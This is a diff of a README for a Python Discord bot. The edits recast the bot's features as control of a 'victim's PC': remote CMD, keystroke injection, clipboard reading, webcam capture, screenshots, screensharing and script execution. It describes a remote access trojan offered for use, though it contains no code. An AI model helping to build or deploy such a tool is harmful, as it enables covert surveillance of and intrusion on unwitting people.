@@ -10,18 +10,21 @@ My Discord Bot is a versatile and customizable Discord bot built with Python usi
 ## Features
 
 - **Control:**
-  - `!cmd` - Execute shell commands remotely.
-  - `!write` - Type text on a remote user's keyboard.
-  - `!openlink` - Open a web link in a remote user's browser.
-  - `!speak` - Perform text-to-speech on a remote user's device.
-  - `!popup` - Create custom windows on remote users' devices.
-  - `!runscript` - Run Python scripts on remote users' devices.
+  - `!cmd` - allows you to use CMD on your victim's PC.
+  - `!write` - allows you to type anything on the victim's keyboard.
+  - `!openlink` - allows you to open a link in the victim's browser.
+  - `!setclip` - allows you to set what the clipboard is on victim's PC.
+  - `!speak` - allows you to do TTS on your victim's PC.
+  - `!popup` - allows you to create a custom window on the victims PC.
+  - `!runscript` - allows you to run a python file on the victims PC.
 
-- **View:**
-  - `!systeminfo` - Retrieve system information from remote users.
-  - `!webcam` - Capture webcam images from remote users.
-  - `!screenshot` - Capture screenshots from remote users' devices.
-  - `!screenshare` - Screenshare remote users' screens.
+- **Observe:**
+  - `!connected` - allows you to see your who are connected right now.
+  - `!systeminfo` - allows you to see your victim's system information.
+  - `!webcam` - allows you to take a picture on the victims webcam.
+  - `!screenshot` - allows you to take a screenshot on the victims PC.
+  - `!screenshare` - allows you to screenshare the victims screen.
+  - `!getclip` - allows you to see what the clipboard is.
 
 - **Terminate:**
   - `!shutdown` - Shutdown remote users' devices.
@@ -46,6 +49,7 @@ With more commands to come...
 ## Usage
 
 - Use the `!commands` command to learn about specific commands and their usage.
+- If you want to learn more about a command do `!deepdive [command]`.
 - Follow the bot's guidelines and use its commands responsibly.
 
 ## Acknowledgments
